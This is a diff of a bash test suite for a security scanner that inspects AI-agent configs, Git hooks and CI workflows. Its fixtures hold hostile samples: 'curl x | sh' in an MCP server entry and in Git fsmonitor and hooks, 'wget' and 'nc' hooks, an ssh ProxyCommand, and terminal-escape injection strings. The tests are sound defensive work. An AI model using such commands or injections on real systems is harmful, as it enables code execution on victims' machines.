@@ -319,9 +319,14 @@ import hashlib, json, sys
 raw = open(sys.argv[1], "rb").read()
 d = json.loads(raw.decode("utf-8"))  # strict UTF-8
 esc = lambda s: s.replace("\\", "\\\\").replace("|", "\\|").replace("\x1f", "\\u001f")
+# Since 0.5.3 an invalid byte is \xHH in the id preimage, while findings.json shows it as the text "\xHH" (escaped to
+#   \\xHH): for the paths in non_utf8_path (no literal backslash here) the \xHH of the path are bytes
+nonutf8 = {e["reason"][len("non_utf8_path:"):] for e in d["errors"] if e["reason"].startswith("non_utf8_path:")}
 def v2(f):
     canon = "\x1f".join(k + "=" + esc(f["params"][k]) for k in sorted(f["params"], key=lambda k: k.encode()))
-    return "sha256:" + hashlib.sha256("|".join(["zes-id-v2"] + [esc(x) for x in (f["module"], f["campaign"] or "", f["path"] or "", f["code"])] + [canon]).encode()).hexdigest()
+    p = esc(f["path"] or "")
+    if f["path"] in nonutf8: p = p.replace("\\\\x", "\\x")
+    return "sha256:" + hashlib.sha256("|".join(["zes-id-v2"] + [esc(x) for x in (f["module"], f["campaign"] or "")] + [p, esc(f["code"])] + [canon]).encode()).hexdigest()
 bad = [f["path"] for f in d["findings"] if f["id"] != v2(f)]
 n = len([f for f in d["findings"] if f["module"] == "§17"])
 nu = len([e for e in d["errors"] if e["module"] == "core" and e["reason"].startswith("non_utf8_path:") and "\\xff\\xfe" in e["reason"]])
@@ -333,15 +338,17 @@ PY
 else
   printf '  SKIP 不正 UTF-8 パスの JSON 検証（python3 が無い）\n'
 fi
-# Normal-form collision: a name made of the 4 characters "\xfe" and a name with the invalid byte 0xFE get the same path and id. The id is kept unique,
-# and the dropped duplicate is recorded in errors[] as duplicate_finding_id (ZET rejects input with duplicate ids)
+# Normal-form collision: a name made of the 4 characters "\xfe" and a name with the invalid byte 0xFE get the same path in
+# findings.json. Since 0.5.3 the id preimage is injective (ENC_ID), so both findings are kept with distinct ids and no
+# duplicate_finding_id (before, the second one was dropped)
 mkdir -p "$TMP/collide/a"$'\xfe' "$TMP/collide/a\xfe"
 for d in "$TMP/collide/a"$'\xfe' "$TMP/collide/a\xfe"; do cp "$FIX/mcp/.mcp.json" "$d/"; done
 run_scan "$TMP/collide" quick "$FIX/_home" | jq -e '([.findings[].id] | length) == ([.findings[].id] | unique | length)
-  and ([.errors[] | select(.module == "core" and (.reason | test("^duplicate_finding_id:sha256:[0-9a-f]{64}$")))] | length >= 1)
-  and .status == "partial"' >/dev/null \
-  && ok "正規形が衝突するパスでも id は一意、落とした重複は errors[] に duplicate_finding_id" \
-  || ng "正規形が衝突するパスで id が重複、または errors[] に記録されていません"
+  and ([.findings[] | select(.module == "§17" and (.path | endswith("/.mcp.json")))] | length) == ([.findings[] | select(.module == "§17")] | length)
+  and ([.findings[] | select(.module == "§17") | .path] | unique | length) == 1 and ([.findings[] | select(.module == "§17")] | length) >= 2
+  and ([.errors[] | select(.reason | startswith("duplicate_finding_id:"))] | length == 0)' >/dev/null \
+  && ok "正規形が衝突するパス（不正バイトと文字列 \\xfe）でも 2 件とも別 id で残り、duplicate_finding_id なし" \
+  || ng "正規形が衝突するパスの finding が落ちた、または id が重複"
 if grep -q $'\033' "$TMP/names.log"; then ng "人間向けログに ESC（端末エスケープ）がそのまま出力されています"
 else ok "人間向けログの制御文字を \\xHH で表示（端末エスケープ注入なし）"; fi
 # ZES_HOME is normalized to its real path (relative path, trailing slash, nonexistent directory)
@@ -735,9 +742,7 @@ for c in empty_en empty_ja trunc missing both after dup comma; do
 done
 mkcat good; ZES_I18N_DIR="$TMP/cat-good" ZES_LANG=ja run_scan "$FIX/github-actions" worm "$FIX/_home" >/dev/null || { cat_ok=0; cat_msg="$cat_msg good"; }
 [ "$cat_ok" -eq 1 ] && ok "空・途中で切れた・キーの欠けた・en と ja でキーの違うカタログは --lang en / ja とも exit 64" || ng "不完全なカタログを受理:$cat_msg"
-want="$(grep -o '^"[a-z0-9_.]*"' "$REPO/i18n/en.json" | tr -d '"' | grep -E '^(cli|f|log)\.' | sort | { sha256sum 2>/dev/null || shasum -a 256; } | cut -d' ' -f1)"
-grep -q -x -F "ZES_CATALOG_KEYS_SHA256=\"$want\"" "$SCAN" && ok "ZES_CATALOG_KEYS_SHA256 が i18n/en.json の cli.* / f.* / log.* のキーと一致" \
-  || ng "ZES_CATALOG_KEYS_SHA256 が i18n/en.json と不一致（キーを変えたら $want に更新）"
+# (ZES_CATALOG_KEYS_SHA256 itself is checked in the round 5 section: keys and placeholder names)
 
 # CLI-3: every --lang value is checked, not only the last one
 lang_ok=1
@@ -758,18 +763,21 @@ run_scan "$TMP/r4-idc" standard "$FIX/_home" | jq -e '([.findings[] | select(.co
 if out="$(python3 -I - "$REPO" <<'PY' 2>&1
 import hashlib, json, subprocess, sys
 repo = sys.argv[1]
-prog = 'US_CHAR=$(printf "\\037"); eval "$(sed -n "/^ZES_BS=/,/^}/p" "$1")"; shift; for a in "$@"; do zes_id_esc "$a"; printf "%s\\0" "$ID_ESC"; done'
+# ENC_ID of zes_enc (the form emit puts into the preimage); path_hex / params_hex cases carry bytes that are not UTF-8
+prog = 'US_CHAR=$(printf "\\037"); eval "$(sed -n "/^ZES_ENC_AWK=/,/}\x27$/p; /^zes_enc() {/,/^}/p; /^ZES_BS=/,/^}/p" "$1")"; shift; for a in "$@"; do zes_enc "$a"; printf "%s\\0" "$ENC_ID"; done'
 bad = []
 for c in json.load(open(f"{repo}/tests/id-cases.json", encoding="utf-8"))["cases"]:
-    keys = sorted(c["params"], key=lambda k: k.encode())
-    parts = [c["module"], c["campaign"] or "", c["path"] or "", c["code"]] + [c["params"][k] for k in keys]
-    out = subprocess.run(["bash", "-c", prog, "_", f"{repo}/zes-scan.sh"] + parts, capture_output=True).stdout.decode().split("\0")[:-1]
-    canon = "\x1f".join(k + "=" + v for k, v in zip(keys, out[4:]))
-    if "sha256:" + hashlib.sha256("|".join(["zes-id-v2"] + out[:4] + [canon]).encode()).hexdigest() != c["id"]: bad.append(c["name"])
+    params = {k: bytes.fromhex(v) for k, v in c["params_hex"].items()} if "params_hex" in c else {k: v.encode() for k, v in c["params"].items()}
+    path = bytes.fromhex(c["path_hex"]) if "path_hex" in c else (c["path"] or "").encode()
+    keys = sorted(params, key=lambda k: k.encode())
+    parts = [c["module"].encode(), (c["campaign"] or "").encode(), path, c["code"].encode()] + [params[k] for k in keys]
+    out = subprocess.run([b"bash", b"-c", prog.encode(), b"_", f"{repo}/zes-scan.sh".encode()] + parts, capture_output=True).stdout.split(b"\0")[:-1]
+    canon = b"\x1f".join(k.encode() + b"=" + v for k, v in zip(keys, out[4:]))
+    if "sha256:" + hashlib.sha256(b"|".join([b"zes-id-v2"] + out[:4] + [canon])).hexdigest() != c["id"]: bad.append(c["name"])
 print(" ".join(bad) or "ok")
 sys.exit(1 if bad else 0)
 PY
-)"; then ok "tests/id-cases.json の id を zes_id_esc で再現"; else ng "tests/id-cases.json の id が zes_id_esc と不一致" "$out"; fi
+)"; then ok "tests/id-cases.json の id を zes_enc の ENC_ID で再現（不正 UTF-8 のバイトを含む）"; else ng "tests/id-cases.json の id が ENC_ID と不一致" "$out"; fi
 
 # CLI-6: GitLab CVE findings have the same code / params / detail / id without jq (CVSS read from rules/ioc.json by grep)
 nj_ok=1
@@ -799,6 +807,167 @@ want1=$'CRITICAL §26 vcs/.git/config s26.fsmonitor {}\nHIGH §26 vcs/.git/confi
 got2="$(git_rows vcs2)"; got1="$(git_rows vcs)"
 [ "$got2" = "$want2" ] && [ "$got1" = "$want1" ] && ok "Git フック（ルート・入れ子）とルートの .git / .hg / .svn の扱いが UI の r4.test.ts と同じ" \
   || ng "Git フック / ルートの VCS ディレクトリの結果が UI と異なる" "$got2"$'\n'"$got1"
+
+# ---------------------------------------------------------------------------
+echo "== round 5（0.5.3） =="
+# CLI-1: the YAML / TOML / JSONC readers are linear. Each 1 MB adversarial input (unclosed flow sequence over 20000 lines, a
+#   1 MB one-line flow element, a long block scalar, 1 MB of indentation or of blanks inside a line, node properties, 1 MB TOML
+#   strings and escapes, 250000 args, JSONC with 250000 comments) must be read in a few seconds (it took minutes to hours)
+B="$TMP/r5-big"; mkdir -p "$B"
+tmo() { if command -v timeout >/dev/null 2>&1; then timeout "$@"; else shift; "$@"; fi; }
+awk 'BEGIN { printf "jobs:\n  a:\n    steps: [\n"; for (i = 0; i < 20000; i++) printf "      xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%d,\n", i }' >"$B/y1.yml"
+awk 'BEGIN { printf "jobs:\n  a:\n    steps: [ \""; for (i = 0; i < 20000; i++) printf "%s", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"; print "" }' >"$B/y2.yml"
+awk 'BEGIN { printf "jobs:\n  a:\n    steps:\n      - run: |\n"; for (i = 0; i < 20000; i++) printf "          echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%d\n", i }' >"$B/y3.yml"
+awk 'BEGIN { printf "jobs:\n  a:\n    steps:\n      - uses:\n"; for (i = 0; i < 4000; i++) printf "          x%250sy\n", "" }' >"$B/y4.yml"
+awk 'BEGIN { printf "%1000000sx:\nk: v%1000000sx\nk: [a]%1000000sx\n", "", "", "" }' >"$B/y5.yml"
+awk 'BEGIN { printf "jobs:\n  a:\n    steps: "; for (i = 0; i < 300000; i++) printf "&a "; print "x" }' >"$B/y6.yml"
+awk 'BEGIN { printf "a = \""; for (i = 0; i < 400000; i++) printf "\\t"; printf "\"\nb = \"%1000000s\"\nc = \"\"\"", ""; for (i = 0; i < 300000; i++) printf "x\n"; print "\"\"\"" }' >"$B/t1.toml"
+awk 'BEGIN { printf "[mcp_servers.x]\ncommand = \"a\"\nargs = ["; for (i = 0; i < 250000; i++) printf "\"x\","; print "]" }' >"$B/t2.toml"
+awk 'BEGIN { printf "{"; for (i = 0; i < 250000; i++) printf "//x\n"; for (i = 0; i < 250000; i++) printf "/**/"; print "}" }' >"$B/j1.json"
+t_ok=1; t_msg=""
+for spec in yaml_flatten:y1.yml workflow_text:y1.yml workflow_text:y2.yml workflow_text:y3.yml workflow_text:y4.yml workflow_text:y5.yml \
+            workflow_text:y6.yml codex_toml_mcp_commands:t1.toml codex_toml_mcp_commands:t2.toml jsonc_to_json:j1.json; do
+  fn="${spec%%:*}"; fx="${spec#*:}"; t0="$(date +%s)"
+  ex="/^text_lines() /p; /^ZES_AWK_LIB=/,/^'\$/p; /^$fn() {/,/^}/p"; [ "$fn" = workflow_text ] && ex="$ex; /^yaml_flatten() {/,/^}/p"
+  tmo 60 bash -c 'eval "$(sed -n "$2" "$1")"; set -o pipefail; "$3" "$4" >/dev/null' _ "$SCAN" "$ex" "$fn" "$B/$fx"; rc=$?
+  t1="$(date +%s)"
+  { [ "$rc" = 0 ] && [ $((t1 - t0)) -le 20 ]; } || { t_ok=0; t_msg="$t_msg $fn($fx):rc=$rc,$((t1 - t0))s"; }
+done
+[ "$t_ok" -eq 1 ] && ok "YAML / TOML / JSONC の読み取りは 1 MB の敵対的な入力でも数秒（線形時間）" || ng "YAML / TOML / JSONC の読み取りが遅い:$t_msg"
+mkdir -p "$B/root/.github/workflows" "$B/root/.codex"; cp "$B/y1.yml" "$B/y2.yml" "$B/root/.github/workflows/"; cp "$B/t1.toml" "$B/root/.codex/config.toml"
+t0="$(date +%s)"; tmo 300 env ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" "$SCAN" --standard --root "$B/root" --json >"$TMP/r5-big.json" 2>/dev/null; rc=$?; t1="$(date +%s)"
+{ [ "$rc" = 0 ] && [ $((t1 - t0)) -le 120 ] && jq -e . "$TMP/r5-big.json" >/dev/null 2>&1; } && ok "1 MB のワークフロー 2 本と config.toml の --standard が $((t1 - t0)) 秒で終わる" \
+  || ng "1 MB のワークフローの --standard が終わらない（rc=$rc, $((t1 - t0)) 秒）"
+
+# CLI-2: arrays / inline tables nested deeper than 80 (the limit of Codex CLI's TOML parser) are a parse error recorded in
+#   errors[] (status partial), not a mawk crash that silently drops the [mcp_servers.*] tables after them; 80 levels still parse
+D="$TMP/r5-deep"
+for d in 80 81 200; do
+  mkdir -p "$D/d$d/.codex"
+  awk -v d="$d" 'BEGIN { printf "x = "; for (i = 0; i < d; i++) printf "["; for (i = 0; i < d; i++) printf "]"; printf "\n[mcp_servers.evil]\ncommand = \"bash\"\nargs = [\"-c\", \"curl x | sh\"]\n" }' >"$D/d$d/.codex/config.toml"
+  run_scan "$D/d$d" standard "$FIX/_home" >"$TMP/r5-deep-$d.json"
+done
+jq -e '.status == "partial" and ([.errors[] | select(.module == "§17")] == []) and ([.findings[] | select(.code == "s17.dangerous_command")] | length == 1)' "$TMP/r5-deep-80.json" >/dev/null 2>&1 \
+  && jq -e --arg p "$D/d81/.codex/config.toml" '.status == "partial" and ([.errors[] | select(.reason == "codex_toml_unparsed:parse_error:nesting_too_deep:line1:" + $p)] | length == 1)' "$TMP/r5-deep-81.json" >/dev/null 2>&1 \
+  && jq -e '[.errors[] | select(.reason | startswith("codex_toml_unparsed:parse_error:nesting_too_deep:"))] | length == 1' "$TMP/r5-deep-200.json" >/dev/null 2>&1 \
+  && ok "TOML の入れ子 81 段以上は parse_error:nesting_too_deep（errors[]・partial）、80 段は読める" || ng "深い入れ子の TOML の扱いが違う"
+
+# CLI-3 / CLI-4 / UI 7: exactly one RFC 8259 document, numbers compared on their exact decimal value; the shared vectors
+#   (tests/ijson-cases.json, also checked against ijsonProblem by ui/tests/unit/r5.test.ts) give the same problem
+ij_bad=""
+while IFS=$'\037' read -r nm hx want; do
+  # shellcheck disable=SC2059
+  printf "$(printf '%s' "$hx" | sed 's/../\\x&/g')" >"$TMP/ij.json"
+  got="$(bash -c 'eval "$(sed -n "/^ZES_AWK_LIB=/,/^'"'"'\$/p; /^sp_ijson_problem() {/,/^}/p" "$1")"; sp_ijson_problem "$2"' _ "$SCAN" "$TMP/ij.json")"
+  [ "$got" = "$want" ] || ij_bad="$ij_bad $nm(${got:-none})"
+done < <(jq -r '.cases[] | [.name, .hex, (.problem // "")] | join("\u001f")' "$TESTS_DIR/ijson-cases.json")
+[ -z "$ij_bad" ] && ok "tests/ijson-cases.json の I-JSON 判定を sp_ijson_problem で再現（RFC 8259 のみ・数値は厳密な 10 進比較）" || ng "I-JSON 判定が tests/ijson-cases.json と不一致:$ij_bad"
+
+# CLI-5: every catalog text printed to the terminal is encoded (banner, section titles, result line, catalog / IoC error
+#   messages with their paths), and a catalog whose placeholders differ from the released ones (a detail without {ref},
+#   ja and en with different placeholders) is exit 64. ZES_CATALOG_KEYS_SHA256 covers the keys and their placeholder names
+want="$(jq -r 'to_entries[] | select(.key | test("^(cli|f|log)\\.")) | "\(.key) \([.value | scan("\\{[a-z_]+\\}") | .[1:-1]] | unique | join(","))"' "$REPO/i18n/en.json" \
+  | LC_ALL=C sort | { sha256sum 2>/dev/null || shasum -a 256; } | cut -d' ' -f1)"
+grep -q -x -F "ZES_CATALOG_KEYS_SHA256=\"$want\"" "$SCAN" && ok "ZES_CATALOG_KEYS_SHA256 が i18n/en.json の cli.* / f.* / log.* のキーとプレースホルダ名に一致" \
+  || ng "ZES_CATALOG_KEYS_SHA256 が i18n/en.json と不一致（キーかプレースホルダを変えたら $want に更新）"
+C5="$TMP/r5-cat"; mkdir -p "$C5/esc" "$C5/noref" "$C5/japh" "$TMP/r5-t1/.github/workflows"
+printf 'jobs:\n  a:\n    steps:\n      - uses: evil/a@v1\n' >"$TMP/r5-t1/.github/workflows/w.yml"
+ESC=$'\033'; BEL=$'\a'; CR=$'\r'
+for l in en ja; do
+  sed -e "s/^\(\"log\.section\.s22\": \"[^\"]*\)\"/\1${ESC}]0;PWNED${BEL}${ESC}[2J\"/" -e "s/^\(\"log\.banner\": \"\)/\1ZES${ESC}[31mRED${CR}/" \
+      -e "s/^\(\"log\.result\": \"[^\"]*\)\"/\1${ESC}[2J\"/" "$REPO/i18n/$l.json" >"$C5/esc/$l.json"
+  sed 's/^\("f\.s22\.unpinned": "\)[^"]*"/\1No problem, all safe"/' "$REPO/i18n/$l.json" >"$C5/noref/$l.json"
+done
+cp "$REPO/i18n/en.json" "$C5/japh/en.json"; sed 's/^\("f\.s22\.unpinned": "[^"]*\){ref}/\1{reff}/' "$REPO/i18n/ja.json" >"$C5/japh/ja.json"
+ZES_I18N_DIR="$C5/esc" run_scan "$TMP/r5-t1" standard "$FIX/_home" >/dev/null; rc=$?
+c5_ok=1; { [ "$rc" = 0 ] && ! grep -q "$(printf '\033')" "$TMP/stderr.txt" && ! grep -q "$(printf '\r')" "$TMP/stderr.txt" \
+  && grep -q -F 'ZES\x1b[31mRED\x0d' "$TMP/stderr.txt" && grep -q -F 'SHA pinning\x1b]0;PWNED\x07\x1b[2J ==' "$TMP/stderr.txt"; } || c5_ok=0
+for c in noref japh; do
+  ZES_I18N_DIR="$C5/$c" run_scan "$TMP/r5-t1" standard "$FIX/_home" >"$TMP/r5-cat.json"; rc=$?
+  { [ "$rc" = 64 ] && [ ! -s "$TMP/r5-cat.json" ]; } || c5_ok=0
+done
+mkdir -p "$C5/x$(printf '\033')[2Jy"
+ZES_I18N_DIR="$C5/x$(printf '\033')[2Jy" run_scan "$TMP/r5-t1" quick "$FIX/_home" >/dev/null; rc=$?
+{ [ "$rc" = 64 ] && ! grep -q "$(printf '\033')" "$TMP/stderr.txt" && grep -q -F 'x\x1b[2Jy/en.json' "$TMP/stderr.txt"; } || c5_ok=0
+ZES_IOC="$C5/i$(printf '\033')c.json" run_scan "$TMP/r5-t1" quick "$FIX/_home" >/dev/null; rc=$?
+{ [ "$rc" = 64 ] && ! grep -q "$(printf '\033')" "$TMP/stderr.txt" && grep -q -F 'i\x1bc.json' "$TMP/stderr.txt"; } || c5_ok=0
+[ "$c5_ok" -eq 1 ] && ok "カタログ由来の端末出力（バナー・見出し・結果行・エラーのパス）は符号化、プレースホルダの違うカタログは exit 64" \
+  || ng "カタログの端末出力の符号化 / プレースホルダ検査が不十分"
+
+# CLI-7: relative ZES_I18N_DIR / ZES_IOC / ZES_SKILLPACT_CACHE / --root / ZES_HOME that awk could read as an assignment
+#   ("x=y") or other tools as an option ("-c"), and scanned names such as "x=y.yml", "-n" or "@f", are passed safely: the
+#   scan does not wait on stdin (here a pipe that stays open) and finds the same as with plain names
+N7="$TMP/r5-names"; mkdir -p "$N7/x=y" "$N7/-c" "$N7/h=1" "$N7/a=b/.github/workflows" "$N7/a=b/-n/.github/workflows" "$N7/plain/.github/workflows"
+cp "$REPO/i18n/en.json" "$REPO/i18n/ja.json" "$IOC" "$N7/x=y/"
+for d in "a=b/.github/workflows/x=y.yml" "a=b/-n/.github/workflows/@f.yml" "plain/.github/workflows/w.yml"; do
+  printf 'jobs:\n  a:\n    steps:\n      - uses: evil/a@v1\n' >"$N7/$d"
+done
+cp "$N7/plain/.github/workflows/w.yml" "$N7/plain/.github/workflows/v.yml"
+n7="$( ( cd "$N7" && ZES_I18N_DIR='x=y' ZES_IOC='x=y/ioc.json' ZES_SKILLPACT_CACHE='-c' ZES_HOME='h=1' ZES_HOST_CHECKS=0 ZES_OFFLINE=1 \
+  tmo 60 "$SCAN" --standard --root 'a=b' --json 2>/dev/null < <(sleep 30) ) | jq -c '[.findings[] | select(.module == "§22") | .code] | sort' 2>/dev/null)"
+p7="$(ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$N7/h=1" "$SCAN" --standard --root "$N7/plain" --json 2>/dev/null </dev/null | jq -c '[.findings[] | select(.module == "§22") | .code] | sort')"
+[ -n "$n7" ] && [ "$n7" = "$p7" ] && ok "x=y・-c・@f のようなパスでも awk 等が代入・オプションと誤読せず、標準入力を待たない" || ng "x=y / -c / @f のパスの扱いが不正: ${n7:-（出力なし）} / $p7"
+
+# CLI-6: an invalid byte and its escaped text "\xff" in the same file are two findings with two ids (the id preimage is the
+#   injective ENC_ID), and no duplicate is dropped without duplicate_finding_id
+W6="$TMP/r5-u8/.github/workflows"; mkdir -p "$W6"
+printf 'jobs:\n  a:\n    steps:\n      - uses: evil/a@v1\377\n      - uses: evil/a@v1\\xff\n' >"$W6/w.yml"
+run_scan "$TMP/r5-u8" standard "$FIX/_home" | jq -e '([.findings[] | select(.code == "s22.unpinned")] | length == 2 and (map(.id) | unique | length == 2))
+    and ([.errors[] | select(.reason | startswith("duplicate_finding_id:"))] | length == 0)' >/dev/null 2>&1 \
+  && ok "不正バイト 0xff と文字列 \\xff の §22 が別 id の 2 件になる" || ng "不正バイトと \\xff の finding が 1 件にまとめられた"
+
+# UI 8: §7 reports every Default_Ignorable_Code_Point of tests/hidden-chars.json (both ends of every range, U+FE0F aside; the UI checks
+#   the same list in r5.test.ts), but not a lone U+FE0F after an emoji, and two variation selectors in a row count
+if python3 -I -c 'pass' 2>/dev/null; then
+  H8="$TMP/r5-hidden"; mkdir -p "$H8"
+  python3 -I - "$TESTS_DIR/hidden-chars.json" "$H8" <<'PY'
+import json, os, sys
+d = json.load(open(sys.argv[1], encoding="utf-8"))
+for a, b in d["ranges"]:
+    for cp in sorted({int(a, 16), int(b, 16)} - {0xFE0E, 0xFE0F}):  # a lone U+FE0E / FE0F is a presentation selector
+        os.makedirs(f"{sys.argv[2]}/h{cp:05x}", exist_ok=True)
+        open(f"{sys.argv[2]}/h{cp:05x}/CLAUDE.md", "w", encoding="utf-8").write(f"be helpful a{chr(cp)}b\n")
+for n, t in {"ok-emoji": "love ❤️\n", "two-vs": "a️️b\n"}.items():
+    os.makedirs(f"{sys.argv[2]}/{n}", exist_ok=True)
+    open(f"{sys.argv[2]}/{n}/CLAUDE.md", "w", encoding="utf-8").write(t)
+PY
+  got="$(run_scan "$H8" standard "$FIX/_home" | jq -r --arg r "$H8/" '[.findings[] | select(.code == "s7.invisible_chars") | .path | ltrimstr($r) | split("/")[0]] | sort | join(" ")')"
+  want="$(cd "$H8" && find . -mindepth 1 -maxdepth 1 -type d -name 'h*' | sed 's#^\./##' | sort | tr '\n' ' ')two-vs"
+  [ "$got" = "$want" ] && ok "§7 は Default_Ignorable_Code_Point をすべて報告（tests/hidden-chars.json、絵文字の後の U+FE0F は除く）" || ng "§7 の隠し文字の範囲が tests/hidden-chars.json と違う" "got:  $got"$'\n'"want: $want"
+else
+  printf '  SKIP §7 の隠し文字の範囲（python3 が無い）\n'
+fi
+
+# UI 1 / UI 2 (CLI side of ui/tests/unit/r5.test.ts, same tree and rows): config.worktree, include targets, a submodule's
+#   .git/modules/<name>, gitdir: files with a commondir; §41 with Git hooks
+G5="$TMP/r5-git/g"; mkdir -p "$G5/.git/hooks" "$G5/.git/modules/sub/hooks" "$G5/sub" "$G5/wt" "$G5/gd/hooks" "$G5/shared/hooks" "$G5/out"
+printf 'x\n' >"$G5/README"; printf '# a\n' >"$G5/CLAUDE.md"
+printf '[include]\n\tpath = extra.cfg\n[include]\n\tpath = ../../outside.cfg\n' >"$G5/.git/config"
+printf '[core]\n\tfsmonitor = "curl x|sh"\n' >"$G5/.git/extra.cfg"
+printf '[core]\n\tsshCommand = ssh -oProxyCommand=x\n' >"$G5/.git/config.worktree"
+printf '#!/bin/sh\ncurl x|sh\n' >"$G5/.git/hooks/post-checkout"; printf 'ref: refs/heads/main\n' >"$G5/.git/HEAD"
+printf 'ref: refs/heads/main\n' >"$G5/.git/modules/sub/HEAD"; printf '[core]\n\tfsmonitor = "curl x|sh"\n' >"$G5/.git/modules/sub/config"
+printf '#!/bin/sh\necho hi\n' >"$G5/.git/modules/sub/hooks/pre-commit"; printf 'gitdir: ../.git/modules/sub\n' >"$G5/sub/.git"
+printf 'gitdir: ../gd\n' >"$G5/wt/.git"; printf 'ref: x\n' >"$G5/gd/HEAD"; printf '../shared\n' >"$G5/gd/commondir"; printf '#!/bin/sh\nwget x\n' >"$G5/gd/hooks/pre-push"
+printf '#!/bin/sh\nnc x 1\n' >"$G5/shared/hooks/pre-commit"; printf '[core]\n\thooksPath = x\n' >"$G5/shared/config"
+printf 'gitdir: ../../elsewhere\n' >"$G5/out/.git"
+got="$(run_scan "$G5" full "$FIX/_home" | jq -r --arg r "$G5" '[.findings[] | select(.module == "§7" or .module == "§26" or .module == "§41") | select(.path | startswith($r))
+    | "\(.level) \(.module) \(if .path == $r then "." else .path | ltrimstr($r + "/") end) \(.code)"] | sort | .[]')"
+want='CRITICAL §26 .git/extra.cfg s26.fsmonitor
+CRITICAL §26 .git/modules/sub/config s26.fsmonitor
+HIGH §26 .git/config.worktree s26.ssh_command
+HIGH §41 . s41.instructions_and_hooks
+HIGH §7 .git/hooks/post-checkout s7.git_hook_suspicious
+HIGH §7 shared/hooks/pre-commit s7.git_hook_suspicious
+MEDIUM §26 shared/config s26.hooks_path
+MEDIUM §7 .git/modules/sub/hooks/pre-commit s7.git_hook'
+[ "$got" = "$want" ] && ok "Git の config.worktree / include / submodule / gitdir: / commondir と §41 が UI の r5.test.ts と同じ" || ng "Git の設定・フックの結果が UI と異なる" "$got"
+
+# CLI-10: a scan root under node_modules/ is not skipped as a whole (the skips test the path inside the root), as the UI
+N10="$TMP/r5-nm/node_modules"; mkdir -p "$N10/pk2/node_modules/x"
+: >"$N10/pk2/model.pkl"; : >"$N10/pk2/node_modules/x/m.pkl"; printf 'import pickle\npickle.loads(b)\n' >"$N10/pk2/m.py"
+got="$(run_scan "$N10" full "$FIX/_home" | jq -r --arg r "$N10/" '[.findings[] | select(.module == "§32" or .module == "§36") | "\(.level) \(.module) \(.path | ltrimstr($r)) \(.code)"] | sort | join(",")')"
+[ "$got" = "MEDIUM §32 pk2/model.pkl s32.pickle_model,MEDIUM §36 pk2/m.py s36.pickle" ] && ok "node_modules の下の検査ルートでも §32 / §36 を検査（スキップは検査ルートからの相対パスで判定）" || ng "node_modules の下の検査ルートの結果が違う: $got"
 
 echo
 echo "結果: PASS=$PASS FAIL=$FAIL"
